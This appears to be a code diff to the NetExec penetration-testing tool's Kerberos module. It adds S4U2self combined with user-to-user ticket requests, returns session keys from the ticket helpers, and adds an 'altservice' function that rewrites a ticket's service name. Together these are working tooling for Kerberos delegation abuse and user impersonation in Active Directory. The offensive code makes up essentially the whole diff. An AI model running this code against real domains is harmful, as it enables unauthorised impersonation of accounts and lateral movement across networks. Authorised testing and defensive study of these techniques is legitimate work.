@@ -18,15 +18,17 @@ from impacket.krb5 import constants
 from nxc.logger import nxc_logger
 
 
-def kerberos_login_with_S4U(domain, hostname, username, password, nthash, lmhash, aesKey, kdcHost, impersonate, spn, use_cache, no_s4u2proxy=False):
+def kerberos_login_with_S4U(domain, hostname, username, password, nthash, lmhash, aesKey, kdcHost, impersonate, spn, use_cache, no_s4u2proxy=False, u2u=False):
     my_tgt = None
     if use_cache:
-        domain, _, tgt, _ = CCache.parseFile(domain, username, f"cifs/{hostname}")
-        if my_tgt is None:
-            raise
-        my_tgt = tgt["KDC_REP"]
+        domain, ccache_user, tgt, _ = CCache.parseFile(domain, username)
+        if tgt is None:
+            raise Exception("No TGT found in ccache file")
+        my_tgt = decoder.decode(tgt["KDC_REP"], asn1Spec=AS_REP())[0]
         cipher = tgt["cipher"]
         session_key = tgt["sessionKey"]
+        if not username and ccache_user:
+            username = ccache_user
     if my_tgt is None:
         principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         nxc_logger.debug("Getting TGT for user")
@@ -117,9 +119,14 @@ def kerberos_login_with_S4U(domain, hostname, username, password, nthash, lmhash
     opts.append(constants.KDCOptions.renewable.value)
     opts.append(constants.KDCOptions.canonicalize.value)
 
+    if u2u:
+        opts.append(constants.KDCOptions.renewable_ok.value)
+        opts.append(constants.KDCOptions.enc_tkt_in_skey.value)
+
     req_body["kdc-options"] = constants.encodeFlags(opts)
 
-    server_name = Principal(username, type=constants.PrincipalNameType.NT_UNKNOWN.value)
+    # For U2U, include the domain in the serverName
+    server_name = Principal(username, domain.upper(), type=constants.PrincipalNameType.NT_UNKNOWN.value) if u2u else Principal(username, type=constants.PrincipalNameType.NT_UNKNOWN.value)
 
     seq_set(req_body, "sname", server_name.components_to_asn1)
     req_body["realm"] = str(decoded_tgt["crealm"])
@@ -130,7 +137,10 @@ def kerberos_login_with_S4U(domain, hostname, username, password, nthash, lmhash
     req_body["nonce"] = random.getrandbits(31)
     seq_set_iter(req_body, "etype", (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))
 
-    nxc_logger.info("Requesting S4U2self")
+    if u2u:
+        seq_set_iter(req_body, "additional-tickets", (ticket.to_asn1(TicketAsn1()),))
+
+    nxc_logger.info(f"Requesting S4U2self{'+U2U' if u2u else ''}")
     message = encoder.encode(tgs_req)
 
     r = sendReceive(message, domain, kdcHost)
@@ -156,7 +166,7 @@ def kerberos_login_with_S4U(domain, hostname, username, password, nthash, lmhash
         tgs_formated["KDC_REP"] = r
         tgs_formated["cipher"] = cipher
         tgs_formated["sessionKey"] = new_session_key
-        return tgs_formated
+        return tgs_formated, session_key
 
     ################################################################################
     # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
@@ -275,4 +285,30 @@ def kerberos_login_with_S4U(domain, hostname, username, password, nthash, lmhash
     tgs_formated["KDC_REP"] = r
     tgs_formated["cipher"] = cipher
     tgs_formated["sessionKey"] = new_session_key
-    return tgs_formated
+    return tgs_formated, session_key
+
+
+def get_realm_from_ticket(ticket):
+    tgs_rep = ticket["KDC_REP"]
+    decoded_tgsrep = decoder.decode(tgs_rep, asn1Spec=TGS_REP())[0]
+    return decoded_tgsrep["ticket"]["realm"]
+
+
+def kerberos_altservice(tgs, new_spn):
+    service, host = new_spn.split("/", 1)
+    tgs_rep = tgs["KDC_REP"]
+
+    decoded_tgsrep = decoder.decode(tgs_rep, asn1Spec=TGS_REP())[0]
+
+    # altservice
+    decoded_tgsrep["ticket"]["sname"]["name-string"].clear()
+    decoded_tgsrep["ticket"]["sname"]["name-string"].append(service)
+    decoded_tgsrep["ticket"]["sname"]["name-string"].append(host)
+
+    new_tgs_rep = encoder.encode(decoded_tgsrep)
+
+    new_tgs = {}
+    new_tgs["KDC_REP"] = new_tgs_rep
+    new_tgs["cipher"] = tgs["cipher"]
+    new_tgs["sessionKey"] = tgs["sessionKey"]
+    return new_tgs
